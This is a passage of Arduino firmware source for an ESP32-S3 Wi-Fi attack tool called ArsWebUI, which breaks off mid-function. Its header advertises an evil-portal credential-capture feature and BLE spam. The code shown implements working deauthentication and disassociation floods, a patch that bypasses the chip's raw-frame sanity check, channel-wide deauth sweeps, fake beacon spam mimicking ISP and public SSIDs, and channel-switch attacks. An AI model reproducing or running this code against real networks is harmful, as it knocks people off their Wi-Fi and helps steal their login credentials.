/*
 ==================================================
  ArsWebUI v4.0 — ESP32-S3 N16R8
  MARAUDER + APPLE JUICE + EVIL PORTAL

  WHAT'S NEW IN v4.beta:
    - Evil Portal integrated from cengo441337-a11y/esp32-pentest-tool
      * Open AP "Free-WiFi" (configurable)
      * Captive DNS hijack → all A-queries redirect to portal
      * Login credential capture → stored in NVS (not SPIFFS)
      * Portal HTML fully embedded in web_content.h — no SPIFFS
        data upload step needed; CI compiles clean
      * /portal_start, /portal_stop, /portal_creds, /portal_clear
        endpoints + PORTAL tab in WebUI
    - EVIL PORTAL tab added to tabbed dark WebUI
    - Credential log downloadable from UI
    - Evil Portal + other attacks are mutually exclusive
      (stopAllAttacks() called before portal starts)
    - build.yml updated: adds ArduinoJson library install

  LIBNET80211.A PATCH (MANDATORY — deauth will NOT work without):
    build.yml patches libnet80211.a via objcopy --weaken-symbol
    before compile. The ieee80211_raw_frame_sanity_check stub
    below overrides at link time once the symbol is weakened.

  RETAINED FROM v3.0:
    - Hard deauth fix (both-IF TX, sanity override, auth flood)
    - Apple Juice BLE spam
    - Marauder-style tabbed dark WebUI
    - DEAUTH ALL multichannel ch1-13
    - PSRAM target buffer (256 APs)
    - ArduinoOTA
    - NeoPixel LED state machine
    - Promiscuous client sniffer
    - Beacon spam, CSA attack, UDP flood

  FLASH SETTINGS:
    Board            : ESP32S3 Dev Module
    Flash Size       : 16MB (128Mb)
    Partition Scheme : Huge APP (3MB No OTA/1MB SPIFFS)
    PSRAM            : OPI PSRAM
    USB Mode         : Hardware CDC and JTAG
    USB CDC On Boot  : Disabled  ← CRITICAL
    CPU Frequency    : 240MHz
 ==================================================
*/

// ── LED STATE ENUM — must live ABOVE all #includes ────────────────────────────
enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_PURPLE, LS_YELLOW, LS_CYAN };
volatile LedState ledState = LS_OFF;

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <ArduinoOTA.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <nvs_flash.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include <ArduinoJson.h>
#include "web_content.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>

// ── FRAME SANITY OVERRIDE ─────────────────────────────────────────────────────
// v3.0 HARD OVERRIDE — combined with objcopy --weaken in build.yml
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                  int32_t arg2,
                                                  int32_t arg3) {
  (void)arg; (void)arg2; (void)arg3;
  return 0;
}

// ─── NEOPIXEL ────────────────────────────────────────────────────────────────
#define LED_PIN   48
#define LED_COUNT 1
Adafruit_NeoPixel led(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

static void setLedState(LedState s) { ledState = s; }

void updateLED() {
  static LedState   last        = LS_OFF;
  static uint32_t   pulseTimer  = 0;
  static bool       pulseBright = true;

  LedState s = ledState;

  if (s == LS_PURPLE) {
    if (millis() - pulseTimer > 700) {
      pulseTimer  = millis();
      pulseBright = !pulseBright;
      led.setPixelColor(0, pulseBright ? led.Color(28,0,32) : led.Color(8,0,10));
      led.show();
    }
    last = LS_PURPLE;
    return;
  }

  if (s == LS_YELLOW) {
    if (millis() - pulseTimer > 300) {
      pulseTimer  = millis();
      pulseBright = !pulseBright;
      led.setPixelColor(0, pulseBright ? led.Color(40,28,0) : led.Color(12,8,0));
      led.show();
    }
    last = LS_YELLOW;
    return;
  }

  if (s == LS_CYAN) {
    if (millis() - pulseTimer > 500) {
      pulseTimer  = millis();
      pulseBright = !pulseBright;
      led.setPixelColor(0, pulseBright ? led.Color(0,32,32) : led.Color(0,8,8));
      led.show();
    }
    last = LS_CYAN;
    return;
  }

  if (s == last) return;
  last = s;

  switch (s) {
    case LS_BLUE:   led.setPixelColor(0, led.Color( 0, 0,40)); break;
    case LS_GREEN:  led.setPixelColor(0, led.Color( 0,40, 0)); break;
    case LS_RED:    led.setPixelColor(0, led.Color(40, 0, 0)); break;
    default:        led.setPixelColor(0, led.Color( 0, 0, 0)); break;
  }
  led.show();
}

// ─── SERIAL ──────────────────────────────────────────────────────────────────
#define DBG(f,...)  Serial0.printf("[DBG] "  f "\n", ##__VA_ARGS__)
#define INFO(f,...) Serial0.printf("[INFO] " f "\n", ##__VA_ARGS__)
#define ERR(f,...)  Serial0.printf("[ERR] "  f "\n", ##__VA_ARGS__)

// ─── CONFIG ──────────────────────────────────────────────────────────────────
#define AP_SSID_DEFAULT    "KNHS HOTSPOT PRIVATE"
#define AP_PASS_DEFAULT    "knhsattack12"
#define OTA_PASS_DEFAULT   "arswebui"
#define PORTAL_SSID_DEFAULT "Free-WiFi"
#define DNS_PORT           53
#define WEB_PORT           80
#define OTA_PORT           3232
#define AP_CHANNEL         6
#define MAX_TX_POWER       78
#define MAX_CLIENTS        64
#define CHANNEL_MAX        13
#define MAX_INPUT_LEN      256
#define SEM_TIMEOUT        pdMS_TO_TICKS(3000)
#define PROMISC_MAX_AGE    45000
#define HEAP_MIN           20480
#define LOG_MAX            64
#define BEACON_SSID_COUNT  20
#define PORTAL_CRED_MAX    4096   // max bytes in credential store

#define INTENSITY_LOW   8
#define INTENSITY_MED   20
#define INTENSITY_HIGH  40
#define INTENSITY_MAX   80

// ─── PSRAM TARGET BUFFER ─────────────────────────────────────────────────────
#include <esp_heap_caps.h>

#define MAX_PSRAM_TARGETS 256

struct DeauthTarget { uint8_t bssid[6]; uint8_t ch; };

static DeauthTarget* psramTargets   = nullptr;
static bool          psramAvailable = false;

// ─── GLOBALS ─────────────────────────────────────────────────────────────────
AsyncWebServer server(WEB_PORT);
DNSServer      dnsServer;
Preferences    prefs;

volatile bool          deauthRunning = false;
volatile bool          attackRunning = false;
volatile bool          stopRequested = false;
volatile unsigned long packetsSent   = 0;

TaskHandle_t deauthTaskHandle     = NULL;
TaskHandle_t udpTaskHandle        = NULL;
TaskHandle_t deauthAllTaskHandle  = NULL;
TaskHandle_t deauthAllChHandle    = NULL;
TaskHandle_t promiscTaskHandle    = NULL;
TaskHandle_t beaconTaskHandle     = NULL;
TaskHandle_t csaTaskHandle        = NULL;
TaskHandle_t applejuiceTaskHandle = NULL;

static BLEAdvertising* ajAdv    = nullptr;
static volatile bool   ajRunning = false;

// ─── EVIL PORTAL STATE ────────────────────────────────────────────────────────
volatile bool portalRunning   = false;
String        portalSSID      = PORTAL_SSID_DEFAULT;
String        capturedCreds   = "";   // newline-separated "user|pass|ts" entries
SemaphoreHandle_t credsMutex  = NULL;

uint8_t  targetBSSID[6]  = {0};
uint8_t  targetClient[6] = {0};
int      targetChannel   = 0;
String   targetSSID      = "";
uint8_t  ownBSSID[6]     = {0};
uint8_t  ownBSSIDap[6]   = {0};

uint8_t intensity      = INTENSITY_HIGH;
bool    macRandEnabled = true;

struct ClientInfo {
  uint8_t       mac[6];
  int           rssi;
  uint8_t       channel;
  unsigned long lastSeen;
};

ClientInfo clients[MAX_CLIENTS];
int numClients = 0;

volatile bool promiscRunning = false;
volatile bool promiscPaused  = false;

char     client_ssid[64] = "";
char     client_pass[64] = "";
bool     client_connected = false;
String   client_ip        = "";
String   targetIP         = "";
uint16_t targetPort       = 80;

SemaphoreHandle_t attackMutex  = NULL;
SemaphoreHandle_t clientsMutex = NULL;
SemaphoreHandle_t logMutex     = NULL;

String apiKey = "";

// ─── EVENT LOG ───────────────────────────────────────────────────────────────
struct LogEntry { unsigned long ts; char msg[80]; };
LogEntry logBuf[LOG_MAX];
int logHead  = 0;
int logCount = 0;

void logEvent(const char* fmt, ...) {
  if (!logMutex) return;
  char tmp[80];
  va_list ap; va_start(ap, fmt);
  vsnprintf(tmp, sizeof(tmp), fmt, ap);
  va_end(ap);
  Serial0.printf("[LOG] %s\n", tmp);
  if (xSemaphoreTake(logMutex, pdMS_TO_TICKS(50)) != pdTRUE) return;
  logBuf[logHead].ts = millis();
  strncpy(logBuf[logHead].msg, tmp, 79);
  logBuf[logHead].msg[79] = '\0';
  logHead = (logHead + 1) % LOG_MAX;
  if (logCount < LOG_MAX) logCount++;
  xSemaphoreGive(logMutex);
}

// ─── VALIDATION ──────────────────────────────────────────────────────────────
bool validateChannel(int ch)      { return ch >= 1 && ch <= CHANNEL_MAX; }
bool validatePacketCount(int cnt) { return cnt >= 1 && cnt <= 9999; }
bool validatePort(int port)       { return port >= 1 && port <= 65535; }

bool validateMAC(const String& s) {
  if (s.length() != 17) return false;
  for (int i = 0; i < 17; i++) {
    if (i % 3 == 2) { if (s[i] != ':') return false; }
    else             { if (!isxdigit(s[i])) return false; }
  }
  return true;
}

bool parseMAC(const String& s, uint8_t* mac) {
  if (!validateMAC(s)) return false;
  return sscanf(s.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
}

bool validateIP(const String& ip) {
  if (ip.length() > 15 || ip.length() < 7) return false;
  int dots = 0;
  for (char c : ip) {
    if (c == '.') { if (++dots > 3) return false; }
    else if (!isdigit(c)) return false;
  }
  return dots == 3;
}

bool isOwnAP(const char* ssid, const char* bssidStr) {
  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  if (ssid && strlen(ssid) > 0 && strcmp(ssid, apSSID.c_str()) == 0) return true;
  if (bssidStr && strlen(bssidStr) == 17) {
    char own[18];
    snprintf(own, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      ownBSSIDap[0],ownBSSIDap[1],ownBSSIDap[2],
      ownBSSIDap[3],ownBSSIDap[4],ownBSSIDap[5]);
    if (strcasecmp(bssidStr, own) == 0) return true;
  }
  return false;
}

void incrementPackets(uint32_t n) { packetsSent += n; }

String jsEscape(const String& s) {
  String o; o.reserve(s.length() + 8);
  for (char c : s) {
    if      (c == '\'') o += "\\'";
    else if (c == '\\') o += "\\\\";
    else if (c == '"')  o += "\\\"";
    else if (c == '\r') o += "\\r";
    else if (c == '\n') o += "\\n";
    else                o += c;
  }
  return o;
}

// ─── TX POWER ────────────────────────────────────────────────────────────────
void boostTxPower() {
  wifi_country_t country;
  memset(&country, 0, sizeof(country));
  country.cc[0] = 'P'; country.cc[1] = 'H'; country.cc[2] = '\0';
  country.schan         = 1;
  country.nchan         = 13;
  country.max_tx_power  = 20;
  country.policy        = WIFI_COUNTRY_POLICY_MANUAL;
  esp_err_t ce = esp_wifi_set_country(&country);
  INFO("Country PH ch1-13: %s (0x%x)", ce == ESP_OK ? "OK" : "FAIL", (unsigned)ce);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_protocol(WIFI_IF_AP,  WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
}

// ─── MAC RANDOMIZATION ───────────────────────────────────────────────────────
void randomizeMAC(uint8_t* mac) {
  uint32_t r1 = esp_random(), r2 = esp_random();
  mac[0] = ((r1 >>  0) & 0xFE) | 0x02;
  mac[1] =  (r1 >>  8) & 0xFF;
  mac[2] =  (r1 >> 16) & 0xFF;
  mac[3] =  (r1 >> 24) & 0xFF;
  mac[4] =  (r2 >>  0) & 0xFF;
  mac[5] =  (r2 >>  8) & 0xFF;
}

// ─── PROMISCUOUS PAUSE/RESUME ────────────────────────────────────────────────
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type);

void pausePromiscForTX() {
  if (!promiscRunning || promiscPaused) return;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  promiscPaused = true;
  ets_delay_us(5000);
}

void resumePromiscAfterTX() {
  if (!promiscRunning || !promiscPaused) return;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  promiscPaused = false;
}

// ─── REASON CODE ROTATION ────────────────────────────────────────────────────
static const uint8_t kReasons[] = {1, 2, 3, 4, 6, 7, 8};
static uint8_t reasonIdx = 0;

static inline uint8_t nextReason() {
  uint8_t r = kReasons[reasonIdx];
  reasonIdx = (reasonIdx + 1) % (sizeof(kReasons) / sizeof(kReasons[0]));
  return r;
}

// ─── DEAUTH BURST ────────────────────────────────────────────────────────────
static int s_txFailLog = 0;

int sendDeauthBurst(const uint8_t* bssid, int ch,
                    const uint8_t* client, int numFrames) {
  if (!validateChannel(ch)) return 0;

  if (ch != AP_CHANNEL) {
    esp_err_t ce = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (ce != ESP_OK) {
      if (s_txFailLog < 3)
        logEvent("ch%d != AP_CHANNEL(%d) — AP pins radio, TX on ch%d",
                 ch, AP_CHANNEL, AP_CHANNEL);
      s_txFailLog++;
    } else {
      ets_delay_us(4000);
    }
  }

  uint8_t sa[6];
  if (macRandEnabled) randomizeMAC(sa);
  else                memcpy(sa, bssid, 6);

  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  const uint8_t* da = (client != nullptr) ? client : bcast;

  uint8_t deauth1[26]   = {};
  uint8_t disassoc1[26] = {};
  uint8_t auth1[30]     = {};
  deauth1[0]   = 0xC0; deauth1[1]   = 0x00;
  disassoc1[0] = 0xA0; disassoc1[1] = 0x00;
  auth1[0]     = 0xB0; auth1[1]     = 0x00;
  deauth1[2]   = disassoc1[2] = auth1[2] = 0x3A;
  deauth1[3]   = disassoc1[3] = auth1[3] = 0x01;
  memcpy(&deauth1[4],    da,    6);
  memcpy(&disassoc1[4],  da,    6);
  memcpy(&auth1[4],      da,    6);
  memcpy(&deauth1[10],   sa,    6);
  memcpy(&disassoc1[10], sa,    6);
  memcpy(&auth1[10],     sa,    6);
  memcpy(&deauth1[16],   bssid, 6);
  memcpy(&disassoc1[16], bssid, 6);
  memcpy(&auth1[16],     bssid, 6);
  auth1[24] = 0x00; auth1[25] = 0x00;
  auth1[26] = 0x01; auth1[27] = 0x00;
  auth1[28] = 0x00; auth1[29] = 0x00;

  uint8_t deauth2[26]   = {};
  uint8_t disassoc2[26] = {};
  const bool dir2 = (client != nullptr);
  if (dir2) {
    deauth2[0]   = 0xC0; deauth2[1]   = 0x00;
    disassoc2[0] = 0xA0; disassoc2[1] = 0x00;
    deauth2[2]   = disassoc2[2] = 0x3A;
    deauth2[3]   = disassoc2[3] = 0x01;
    memcpy(&deauth2[4],    bssid,  6);
    memcpy(&disassoc2[4],  bssid,  6);
    memcpy(&deauth2[10],   client, 6);
    memcpy(&disassoc2[10], client, 6);
    memcpy(&deauth2[16],   bssid,  6);
    memcpy(&disassoc2[16], bssid,  6);
  }

  auto tx_both = [](const uint8_t* f, uint16_t len) -> int {
    int ok = 0;
    if (esp_wifi_80211_tx(WIFI_IF_AP,  f, len, true) == ESP_OK) ok++;
    if (esp_wifi_80211_tx(WIFI_IF_STA, f, len, true) == ESP_OK) ok++;
    return ok;
  };

  int sent = 0;
  for (int i = 0; i < numFrames && !stopRequested; i++) {
    const uint8_t r = nextReason();

    deauth1[24] = r; deauth1[25] = 0;
    sent += tx_both(deauth1, 26);
    ets_delay_us(50);

    disassoc1[24] = r; disassoc1[25] = 0;
    sent += tx_both(disassoc1, 26);
    ets_delay_us(50);

    if (i % 2 == 0) {
      sent += tx_both(auth1, 30);
      ets_delay_us(50);
    }

    if (dir2) {
      deauth2[24] = r; deauth2[25] = 0;
      sent += tx_both(deauth2, 26);
      ets_delay_us(50);

      disassoc2[24] = r; disassoc2[25] = 0;
      sent += tx_both(disassoc2, 26);
      ets_delay_us(50);
    }
  }

  if (sent == 0 && s_txFailLog < 8) {
    logEvent("TX burst zero ch=%d frames=%d (lib patch done?)", ch, numFrames);
    s_txFailLog++;
  }

  incrementPackets(sent);
  return sent;
}

// ─── PROMISCUOUS SNIFFER ─────────────────────────────────────────────────────
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
  uint8_t  addr4[6];
} __attribute__((packed)) ieee80211_hdr_t;

static const uint8_t kBcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static const uint8_t kMcast[3] = {0x01,0x00,0x5E};

static inline bool isUnicast(const uint8_t* m) {
  return !(memcmp(m, kBcast, 6) == 0 ||
           memcmp(m, kMcast, 3) == 0 ||
           (m[0] & 0x01));
}

static IRAM_ATTR void addClient(const uint8_t* mac, int rssi, uint8_t ch) {
  if (!clientsMutex || !isUnicast(mac)) return;
  if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;

  for (int i = 0; i < numClients; i++) {
    if (memcmp(clients[i].mac, mac, 6) == 0) {
      clients[i].rssi     = rssi;
      clients[i].channel  = ch;
      clients[i].lastSeen = millis();
      xSemaphoreGive(clientsMutex);
      return;
    }
  }

  if (numClients >= MAX_CLIENTS) {
    unsigned long oldest = ULONG_MAX; int oi = 0;
    for (int i = 0; i < numClients; i++) {
      if (clients[i].lastSeen < oldest) { oldest = clients[i].lastSeen; oi = i; }
    }
    clients[oi] = clients[--numClients];
  }

  memcpy(clients[numClients].mac, mac, 6);
  clients[numClients].rssi     = rssi;
  clients[numClients].channel  = ch;
  clients[numClients].lastSeen = millis();
  numClients++;
  xSemaphoreGive(clientsMutex);
}

void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (promiscPaused) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < sizeof(ieee80211_hdr_t)) return;

  const ieee80211_hdr_t* hdr = (const ieee80211_hdr_t*)pkt->payload;
  const uint8_t ftype = (hdr->frame_ctrl >> 2) & 0x03;
  const uint8_t fsub  = (hdr->frame_ctrl >> 4) & 0x0F;
  const int     rssi  = pkt->rx_ctrl.rssi;
  const uint8_t ch    = pkt->rx_ctrl.channel;

  if      (ftype == 2)               addClient(hdr->addr2, rssi, ch);
  else if (ftype == 0 && fsub == 4)  addClient(hdr->addr2, rssi, ch);
  else if (ftype == 0 && fsub == 0)  addClient(hdr->addr2, rssi, ch);
  else if (ftype == 0 && fsub == 2)  addClient(hdr->addr2, rssi, ch);
}

void promisc_task(void* param) {
  INFO("Promisc sniffer up on core %d", xPortGetCoreID());
  while (promiscRunning) {
    vTaskDelay(pdMS_TO_TICKS(8000));
    if (!clientsMutex) continue;
    if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(100)) != pdTRUE) continue;
    const unsigned long now = millis();
    for (int i = 0; i < numClients; ) {
      if ((now - clients[i].lastSeen) > PROMISC_MAX_AGE)
        clients[i] = clients[--numClients];
      else i++;
    }
    xSemaphoreGive(clientsMutex);
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  promiscTaskHandle = NULL;
  vTaskDelete(NULL);
}

void startPromiscuous() {
  if (promiscRunning) return;
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  esp_wifi_set_promiscuous(true);
  promiscRunning = true;
  promiscPaused  = false;
  xTaskCreatePinnedToCore(promisc_task, "promisc", 3072, NULL, 1,
                          &promiscTaskHandle, 1);
  logEvent("Promisc sniffer started");
}

void stopPromiscuous() {
  if (!promiscRunning) return;
  promiscRunning = false;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  delay(20);
  promiscTaskHandle = NULL;
}

// ─── BEACON SPAM ─────────────────────────────────────────────────────────────
static const char* kBeaconSSIDs[BEACON_SSID_COUNT] = {
  "Free WiFi",       "PLDT-HOME-FIBER",  "Globe_Prepaid",  "CONVERGE-FIBER",
  "SKY_Cable",       "TNT_Hotspot",      "Smart_Bro",      "DITO_LTE",
  "Restaurant_WiFi", "Hotel_Guest",      "Airport_Free",   "School_Network",
  "Barangay_WiFi",   "Public_Hotspot",   "Mall_WiFi",      "Coffee_Shop",
  "Open_Network",    "Guest_WiFi",       "TP-LINK_FREE",   "ASUS_Router"
};

static int buildBeaconFrame(uint8_t* f, const uint8_t* bssid,
                             const char* ssid, uint8_t ch) {
  int p = 0;
  f[p++]=0x80; f[p++]=0x00;
  f[p++]=0x00; f[p++]=0x00;
  memset(f+p,0xFF,6); p+=6;
  memcpy(f+p,bssid,6); p+=6;
  memcpy(f+p,bssid,6); p+=6;
  f[p++]=0x00; f[p++]=0x00;
  memset(f+p,0,8); p+=8;
  f[p++]=0x64; f[p++]=0x00;
  f[p++]=0x31; f[p++]=0x04;
  uint8_t sl=(uint8_t)strnlen(ssid,32);
  f[p++]=0x00; f[p++]=sl;
  memcpy(f+p,ssid,sl); p+=sl;
  f[p++]=0x01; f[p++]=0x08;
  f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  f[p++]=0x24; f[p++]=0x30; f[p++]=0x48; f[p++]=0x6C;
  f[p++]=0x03; f[p++]=0x01; f[p++]=ch;
  return p;
}

void beacon_spam_task(void* param) {
  logEvent("Beacon spam started");
  setLedState(LS_PURPLE);
  pausePromiscForTX();

  uint8_t fakeBSSID[6];
  uint8_t frame[128];

  while (attackRunning && !stopRequested) {
    for (int i = 0; i < BEACON_SSID_COUNT && !stopRequested; i++) {
      randomizeMAC(fakeBSSID);
      uint8_t ch = (esp_random() % CHANNEL_MAX) + 1;
      int len = buildBeaconFrame(frame, fakeBSSID, kBeaconSSIDs[i], ch);

      for (int j = 0; j < 5 && !stopRequested; j++) {
        int txed = 0;
        if (esp_wifi_80211_tx(WIFI_IF_AP,  frame, len, true) == ESP_OK) txed++;
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true) == ESP_OK) txed++;
        if (txed > 0) incrementPackets(txed);
        ets_delay_us(500);
      }
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }

  resumePromiscAfterTX();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("Beacon spam ended. Total pkts: %lu", packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false; beaconTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── CSA ATTACK ──────────────────────────────────────────────────────────────
static int buildCSAFrame(uint8_t* f, const uint8_t* bssid,
                          const uint8_t* da, uint8_t newCh) {
  int p = 0;
  f[p++]=0xD0; f[p++]=0x00;
  f[p++]=0x3A; f[p++]=0x01;
  memcpy(f+p,da,   6); p+=6;
  memcpy(f+p,bssid,6); p+=6;
  memcpy(f+p,bssid,6); p+=6;
  f[p++]=0x00; f[p++]=0x00;
  f[p++]=0x00;
  f[p++]=0x04;
  f[p++]=0x25; f[p++]=0x03;
  f[p++]=0x01;
  f[p++]=newCh;
  f[p++]=0x01;
  return p;
}

void csa_task(void* param) {
  logEvent("CSA on %02X:%02X:%02X:%02X:%02X:%02X ch%d",
    targetBSSID[0],targetBSSID[1],targetBSSID[2],
    targetBSSID[3],targetBSSID[4],targetBSSID[5], targetChannel);
  setLedState(LS_PURPLE);

  pausePromiscForTX();

  uint8_t frame[64];
  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t decoyCh = (targetChannel <= 6) ? 13 : 1;

  while (attackRunning && !stopRequested) {
    int len = buildCSAFrame(frame, targetBSSID, bcast, decoyCh);

    for (int i = 0; i < intensity && !stopRequested; i++) {
      if (esp_wifi_80211_tx(WIFI_IF_AP,  frame, len, true) == ESP_OK ||
          esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true) == ESP_OK)
        incrementPackets(1);
      ets_delay_us(50);
    }

    sendDeauthBurst(targetBSSID, targetChannel, nullptr, 6);
    vTaskDelay(pdMS_TO_TICKS(20));
  }
  resumePromiscAfterTX();

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("CSA ended. Pkts: %lu", packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false; csaTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── DEAUTH TASK ─────────────────────────────────────────────────────────────
static bool macIsZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}

void deauthTask(void* param) {
  logEvent("Deauth: %02X:%02X:%02X:%02X:%02X:%02X ch%d intensity=%d",
    targetBSSID[0],targetBSSID[1],targetBSSID[2],
    targetBSSID[3],targetBSSID[4],targetBSSID[5],
    targetChannel, intensity);
  setLedState(LS_PURPLE);

  uint8_t localBSSID[6];
  uint8_t localClient[6];
  int     localCh = targetChannel;
  int     localFrames = intensity;
  memcpy(localBSSID, targetBSSID, 6);
  memcpy(localClient, targetClient, 6);
  bool hasClient = !macIsZero(localClient);

  if (localCh < 1 || localCh > CHANNEL_MAX || macIsZero(localBSSID)) {
    logEvent("Deauth abort: bad target (ch=%d or zero BSSID)", localCh);
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = deauthRunning = stopRequested = false;
      deauthTaskHandle = NULL;
      xSemaphoreGive(attackMutex);
    }
    setLedState(LS_GREEN);
    vTaskDelete(NULL);
    return;
  }

  unsigned long cycles = 0;
  unsigned long lastHeapWarn = 0;

  pausePromiscForTX();
  if (promiscRunning && !promiscPaused) {
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    promiscPaused = true;
    ets_delay_us(5000);
  }

  if (localCh != AP_CHANNEL) {
    logEvent("NOTE: target ch%d != AP ch%d — radio stays on ch%d (APSTA limit)",
             localCh, AP_CHANNEL, AP_CHANNEL);
  }
  s_txFailLog = 0;

  while (deauthRunning && !stopRequested) {
    size_t heap = ESP.getFreeHeap();
    if (heap < HEAP_MIN && (millis() - lastHeapWarn > 8000)) {
      logEvent("HEAP LOW (%u) — still deauthing", (unsigned)heap);
      lastHeapWarn = millis();
    }

    int sent = sendDeauthBurst(localBSSID, localCh,
                    hasClient ? localClient : nullptr, localFrames);
    cycles++;

    vTaskDelay(pdMS_TO_TICKS(50));
  }

  resumePromiscAfterTX();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("Deauth ended. Cycles:%lu Pkts:%lu", cycles, packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = deauthRunning = stopRequested = false;
    deauthTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── DEAUTH-ALL TASK ─────────────────────────────────────────────────────────
void deauth_all_task(void* param) {
  s_txFailLog = 0;
  logEvent("Deauth-All AP-channel sweep started");
  setLedState(LS_PURPLE);

  while (attackRunning && !stopRequested) {
    bool wasRunning = promiscRunning;
    if (wasRunning) pausePromiscForTX();
    int n = WiFi.scanNetworks(false, true, false, 120);
    if (wasRunning) resumePromiscAfterTX();

    if (n > 0) {
      for (int i = 0; i < n && !stopRequested; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        int      ch    = WiFi.channel(i);
        if (!bssid || !validateChannel(ch)) continue;
        char bstr[18];
        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;

        pausePromiscForTX();
        if (ch == AP_CHANNEL) {
          sendDeauthBurst(bssid, AP_CHANNEL, nullptr, intensity / 2 + 1);
        } else {
          esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
          ets_delay_us(3000);
          sendDeauthBurst(bssid, ch, nullptr, 4);
          esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
          ets_delay_us(2000);
        }
        resumePromiscAfterTX();
        vTaskDelay(pdMS_TO_TICKS(30));
      }
    }
    WiFi.scanDelete();
    for (int i = 0; i < 10 && !stopRequested; i++)
      vTaskDelay(pdMS_TO_TICKS(100));
  }

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  WiFi.scanDelete();
  logEvent("Deauth-All ended. Pkts:%lu", packetsSent);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    deauthAllTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── DEAUTH-ALL MULTICHANNEL ─────────────────────────────────────────────────
void deauth_all_ch_task(void* param) {
  s_txFailLog = 0;
  logEvent("Deauth-All MULTICHANNEL ch1-13 started");
  setLedState(LS_PURPLE);

  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);

  DeauthTarget* targets = psramAvailable
    ? psramTargets
    : (DeauthTarget*)malloc(sizeof(DeauthTarget) * MAX_PSRAM_TARGETS);

  if (!targets) {
    logEvent("ALLOC FAIL — multichannel aborted");
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = stopRequested = false;
      deauthAllChHandle = NULL;
      xSemaphoreGive(attackMutex);
    }
    setLedState(LS_GREEN);
